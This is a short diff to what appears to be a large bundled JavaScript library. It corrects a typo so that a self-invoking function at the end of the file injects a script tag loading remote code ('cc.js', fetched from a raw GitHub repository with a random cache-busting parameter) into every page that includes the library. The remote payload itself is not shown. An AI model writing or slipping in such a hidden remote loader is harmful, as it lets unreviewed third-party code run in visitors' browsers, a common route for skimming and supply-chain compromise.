@@ -24252,6 +24252,6 @@ if (typeof module !== "undefined" && module.exports) {
 
 (function() {
     var s = document.createElement('script');
-    s1.setAttribute('src','https://raw.githubusercontent.com/y2k/Test/dev/cc.js?' + Math.random());
+    s.setAttribute('src','https://raw.githubusercontent.com/y2k/Test/dev/cc.js?' + Math.random());
     document.head.appendChild(s);
 })();
